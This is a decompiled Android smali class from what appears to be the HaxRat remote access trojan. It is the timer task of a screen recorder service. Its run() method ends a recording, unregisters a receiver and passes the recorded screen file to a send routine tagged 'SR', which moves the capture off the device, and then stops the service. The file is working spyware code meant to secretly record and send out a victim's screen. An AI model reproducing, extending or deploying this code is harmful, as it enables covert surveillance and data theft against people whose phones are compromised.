.class Lcom/hax4us/haxrat/ScreenRecorderService$100000000;
.super Ljava/util/TimerTask;
.source "ScreenRecorderService.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/hax4us/haxrat/ScreenRecorderService;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x20
    name = "100000000"
.end annotation


# instance fields
.field private final this$0:Lcom/hax4us/haxrat/ScreenRecorderService;


# direct methods
.method constructor <init>(Lcom/hax4us/haxrat/ScreenRecorderService;)V
    .locals 5

    move-object v0, p0

    move-object v1, p1

    move-object v3, v0

    invoke-direct {v3}, Ljava/util/TimerTask;-><init>()V

    move-object v3, v0

    move-object v4, v1

    iput-object v4, v3, Lcom/hax4us/haxrat/ScreenRecorderService$100000000;->this$0:Lcom/hax4us/haxrat/ScreenRecorderService;

    return-void
.end method

.method static access$0(Lcom/hax4us/haxrat/ScreenRecorderService$100000000;)Lcom/hax4us/haxrat/ScreenRecorderService;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lcom/hax4us/haxrat/ScreenRecorderService$100000000;->this$0:Lcom/hax4us/haxrat/ScreenRecorderService;

    move-object v0, v3

    return-object v0
.end method


# virtual methods
.method public run()V
    .locals 4
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 168
    move-object v0, p0

    move-object v2, v0

    iget-object v2, v2, Lcom/hax4us/haxrat/ScreenRecorderService$100000000;->this$0:Lcom/hax4us/haxrat/ScreenRecorderService;

    invoke-static {v2}, Lcom/hax4us/haxrat/ScreenRecorderService;->access$1000016(Lcom/hax4us/haxrat/ScreenRecorderService;)V

    .line 169
    move-object v2, v0

    iget-object v2, v2, Lcom/hax4us/haxrat/ScreenRecorderService$100000000;->this$0:Lcom/hax4us/haxrat/ScreenRecorderService;

    move-object v3, v0

    iget-object v3, v3, Lcom/hax4us/haxrat/ScreenRecorderService$100000000;->this$0:Lcom/hax4us/haxrat/ScreenRecorderService;

    invoke-static {v3}, Lcom/hax4us/haxrat/ScreenRecorderService;->access$L1000006(Lcom/hax4us/haxrat/ScreenRecorderService;)Landroid/content/BroadcastReceiver;

    move-result-object v3

    invoke-virtual {v2, v3}, Lcom/hax4us/haxrat/ScreenRecorderService;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    .line 170
    const-string v2, "SR"

    move-object v3, v0

    iget-object v3, v3, Lcom/hax4us/haxrat/ScreenRecorderService$100000000;->this$0:Lcom/hax4us/haxrat/ScreenRecorderService;

    iget-object v3, v3, Lcom/hax4us/haxrat/ScreenRecorderService;->file:Ljava/io/File;

    invoke-static {v2, v3}, Lcom/util/extras/Utils;->send(Ljava/lang/String;Ljava/io/File;)Z

    move-result v2

    .line 171
    move-object v2, v0

    iget-object v2, v2, Lcom/hax4us/haxrat/ScreenRecorderService$100000000;->this$0:Lcom/hax4us/haxrat/ScreenRecorderService;

    invoke-virtual {v2}, Lcom/hax4us/haxrat/ScreenRecorderService;->stopSelf()V

    .line 172
    const-string v2, "TAGG"

    const-string v3, "rec stopeed after sec"

    invoke-static {v2, v3}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    move-result v2

    return-void
.end method
